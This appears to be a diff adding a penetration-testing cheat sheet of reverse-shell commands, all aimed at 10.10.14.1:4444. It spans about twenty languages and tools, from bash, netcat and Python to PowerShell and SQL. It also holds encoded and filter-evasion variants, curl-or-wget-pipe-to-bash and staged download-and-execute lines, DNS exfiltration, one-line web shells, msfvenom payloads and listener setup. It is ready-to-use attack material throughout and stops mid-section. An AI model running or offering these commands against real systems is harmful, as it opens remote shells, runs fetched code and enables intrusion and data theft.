@@ -1,0 +1,399 @@
+# Complete Reverse Shell Commands Collection
+
+```bash
+# =============================================================================
+# BASH REVERSE SHELLS
+# =============================================================================
+
+# Standard bash reverse shell
+bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
+
+# Alternative bash methods
+exec /bin/bash 0&0 2>&0
+0<&196;exec 196<>/dev/tcp/10.10.14.1/4444; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/10.10.14.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# Bash with /dev/tcp
+/bin/bash -i > /dev/tcp/10.10.14.1/4444 0<&1 2>&1
+bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
+
+# Bash using exec
+exec 196<>/dev/tcp/10.10.14.1/4444; sh <&196 >&196 2>&196
+
+# Bash one-liner variants
+sh -i >& /dev/tcp/10.10.14.1/4444 0>&1
+/bin/sh -i >& /dev/tcp/10.10.14.1/4444 0>&1
+
+# Bash UDP reverse shell
+sh -i >& /dev/udp/10.10.14.1/4444 0>&1
+
+# =============================================================================
+# NETCAT REVERSE SHELLS
+# =============================================================================
+
+# Traditional netcat with -e
+nc -e /bin/sh 10.10.14.1 4444
+nc -e /bin/bash 10.10.14.1 4444
+nc -c bash 10.10.14.1 4444
+
+# Netcat without -e flag
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f
+rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.1 4444 0</tmp/p | /bin/bash 1>/tmp/p
+mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.14.1 4444 1>/tmp/backpipe
+
+# Netcat OpenBSD variants
+nc 10.10.14.1 4444 -c bash
+nc 10.10.14.1 4444 -e bash
+
+# Ncat (Nmap's netcat)
+ncat 10.10.14.1 4444 -e /bin/bash
+ncat --udp 10.10.14.1 4444 -e /bin/bash
+
+# Netcat with telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.14.1 4444 0</tmp/p | /bin/bash 1>/tmp/p
+
+# =============================================================================
+# PYTHON REVERSE SHELLS
+# =============================================================================
+
+# Python 2 basic
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Python 3 basic
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Python with PTY
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+# Python with threading
+python -c 'import socket,os,threading,subprocess as sp;p=sp.Popen(["/bin/sh","-i"], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT);s=socket.socket();s.connect(("10.10.14.1",4444));threading.Thread(target=exec,args=("for c in iter(lambda:s.recv(1024),b''):p.stdin.write(c);p.stdin.flush()",),daemon=1).start();threading.Thread(target=exec,args=("for c in iter(lambda:p.stdout.read(1),b''):s.send(c)",),daemon=1).start()'
+
+# Python one-liner short
+python -c 'import os,socket,subprocess;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(["/bin/sh","-i"])'
+
+# Python Windows
+python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+
+# =============================================================================
+# PERL REVERSE SHELLS
+# =============================================================================
+
+# Standard Perl reverse shell
+perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Perl without /bin/sh
+perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system("/bin/sh -i");};'
+
+# Perl Windows
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# Perl alternative
+perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(4444,inet_aton("10.10.14.1")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# =============================================================================
+# RUBY REVERSE SHELLS
+# =============================================================================
+
+# Standard Ruby reverse shell
+ruby -rsocket -e'f=TCPSocket.open("10.10.14.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Ruby alternative
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Ruby Windows
+ruby -rsocket -e 'c=TCPSocket.new("10.10.14.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Ruby with spawn
+ruby -rsocket -TCPSocket.new("10.10.14.1","4444").close_on_exec=false;exec("sh -i <&3 >&3 2>&3")
+
+# =============================================================================
+# PHP REVERSE SHELLS
+# =============================================================================
+
+# Standard PHP reverse shell
+php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP with system
+php -r '$sock=fsockopen("10.10.14.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP with passthru
+php -r '$sock=fsockopen("10.10.14.1",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP with shell_exec
+php -r '$sock=fsockopen("10.10.14.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP with proc_open
+php -r '$sock=fsockopen("10.10.14.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+# PHP alternative method
+php -r '$s=fsockopen("10.10.14.1",4444);$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
+
+# =============================================================================
+# JAVA REVERSE SHELLS
+# =============================================================================
+
+# Java basic reverse shell
+echo 'public class shell { public static void main(String[] args) { Process p; try { p = Runtime.getRuntime().exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor(); } catch(IOException e) { } } }' > /tmp/shell.java
+
+# Java runtime exec
+java -cp .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar shell
+
+# Java alternative
+echo 'import java.io.*;import java.net.*;public class shell{public static void main(String[] args){try{Socket s=new Socket("10.10.14.1",4444);Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();}catch(Exception e){}}}' > shell.java && javac shell.java && java shell
+
+# =============================================================================
+# GOLANG REVERSE SHELLS
+# =============================================================================
+
+# Go reverse shell
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
+
+# Go alternative
+go run -<<EOF
+package main
+import "os/exec"
+import "net"
+func main() {
+    c, _ := net.Dial("tcp", "10.10.14.1:4444")
+    cmd := exec.Command("/bin/sh")
+    cmd.Stdin = c
+    cmd.Stdout = c
+    cmd.Stderr = c
+    cmd.Run()
+}
+EOF
+
+# =============================================================================
+# POWERSHELL REVERSE SHELLS (WINDOWS)
+# =============================================================================
+
+# PowerShell basic
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
+
+# PowerShell one-liner
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# PowerShell short
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/shell.ps1')
+
+# PowerShell base64
+powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+# =============================================================================
+# NODE.JS REVERSE SHELLS
+# =============================================================================
+
+# Node.js basic
+node -e "(function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(4444, '10.10.14.1', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();"
+
+# Node.js alternative
+node -e "require('child_process').spawn('nc', ['10.10.14.1', '4444', '-e', '/bin/bash'])"
+
+# Node.js with require
+node -e "var spawn = require('child_process').spawn; HOST='10.10.14.1'; PORT='4444'; TIMEOUT='5000'; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new require('net').Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write('Connected!\\n'); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end('Disconnected!\\n'); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT);"
+
+# =============================================================================
+# LUA REVERSE SHELLS
+# =============================================================================
+
+# Lua reverse shell
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+# Lua alternative
+lua5.1 -e 'local host, port = "10.10.14.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+
+# =============================================================================
+# AWK REVERSE SHELLS
+# =============================================================================
+
+# AWK reverse shell
+awk 'BEGIN {s = "/inet/tcp/0/10.10.14.1/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+# =============================================================================
+# SOCAT REVERSE SHELLS
+# =============================================================================
+
+# Socat reverse shell
+socat tcp-connect:10.10.14.1:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
+# Socat with TTY
+socat tcp-connect:10.10.14.1:4444 exec:"bash -li",pty,stderr,setsid,sigint,sane
+
+# Socat encrypted
+socat tcp-connect:10.10.14.1:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane,ssl-verify=0
+
+# =============================================================================
+# TELNET REVERSE SHELLS
+# =============================================================================
+
+# Telnet reverse shell
+rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.14.1 4444 0</tmp/p | /bin/bash 1>/tmp/p
+
+# Telnet alternative
+telnet 10.10.14.1 4444 | /bin/bash | telnet 10.10.14.1 4445
+
+# =============================================================================
+# OPENSSL REVERSE SHELLS
+# =============================================================================
+
+# OpenSSL reverse shell
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.1:4444 > /tmp/s; rm /tmp/s
+
+# =============================================================================
+# SQL REVERSE SHELLS
+# =============================================================================
+
+# MySQL UDF reverse shell
+SELECT sys_exec('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1');
+
+# PostgreSQL reverse shell
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"';
+
+# MSSQL xp_cmdshell
+EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.1\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
+
+# =============================================================================
+# MSFVENOM GENERATED REVERSE SHELLS
+# =============================================================================
+
+# Linux x86 reverse shell
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell.elf
+
+# Linux x64 reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell.elf
+
+# Windows reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell.exe
+
+# JSP reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw > shell.jsp
+
+# WAR reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war > shell.war
+
+# =============================================================================
+# BASE64 ENCODED REVERSE SHELLS
+# =============================================================================
+
+# Bash base64
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQo= | base64 -d | bash
+
+# Python base64
+echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjEwLjE0LjEnLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10pOwo= | base64 -d | python3
+
+# Perl base64
+echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMSI7JHA9NDQ0NDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLG5ldHByb2RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d | bash
+
+# =============================================================================
+# HEX ENCODED REVERSE SHELLS
+# =============================================================================
+
+# Bash hex
+bash -c $'\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x31\x30\x2e\x31\x34\x2e\x31\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31'
+
+# =============================================================================
+# SPECIAL CHARACTER BYPASS REVERSE SHELLS
+# =============================================================================
+
+# No spaces (using ${IFS})
+bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.1/4444${IFS}0>&1'
+
+# No quotes (using $'')
+bash -c $'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
+
+# Using environment variables
+IP=10.10.14.1 PORT=4444 bash -c 'exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'
+
+# Using printf
+printf "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" | bash
+
+# =============================================================================
+# FILE-BASED REVERSE SHELLS
+# =============================================================================
+
+# Write and execute
+echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' > /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+
+# Using wget
+wget -qO- http://10.10.14.1:8000/shell.sh | bash
+
+# Using curl
+curl -s http://10.10.14.1:8000/shell.sh | bash
+
+# =============================================================================
+# DNS REVERSE SHELLS
+# =============================================================================
+
+# Using nslookup for data exfiltration
+nslookup $(whoami).10.10.14.1
+
+# DNS reverse shell via TXT records
+dig @10.10.14.1 $(whoami | base64).attacker.com
+
+# =============================================================================
+# ICMP REVERSE SHELLS
+# =============================================================================
+
+# ICMP reverse shell using ping
+ping -c 1 10.10.14.1 -p $(echo "hello" | xxd -p)
+
+# =============================================================================
+# WEB-BASED REVERSE SHELLS
+# =============================================================================
+
+# PHP web shell
+<?php system($_GET['cmd']); ?>
+
+# JSP web shell
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+# ASP web shell
+<%eval request("cmd")%>
+
+# ASPX web shell
+<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>
+
+# =============================================================================
+# STAGED REVERSE SHELLS
+# =============================================================================
+
+# Multi-stage Python
+python3 -c "import urllib.request; exec(urllib.request.urlopen('http://10.10.14.1:8000/stage2.py').read())"
+
+# Multi-stage PowerShell
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1:8000/stage2.ps1')"
+
+# Multi-stage Bash
+bash -c "$(curl -fsSL http://10.10.14.1:8000/stage2.sh)"
+
+# =============================================================================
+# LISTENER COMMANDS
+# =============================================================================
+
+# Netcat listener
+nc -lvnp 4444
+
+# Socat listener
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# OpenSSL listener
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+
+# Metasploit multi/handler
+use exploit/multi/handler
+set payload linux/x64/shell_reverse_tcp
+set LHOST 10.10.14.1
+set LPORT 4444
+exploit
+
+# =============================================================================
+# UPGRADE TO INTERACTIVE SHELL
+# =============================================================================
+
+# Python PTY upgrade
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl+Z
+stty raw -echo; fg
+
+# Script upgrade
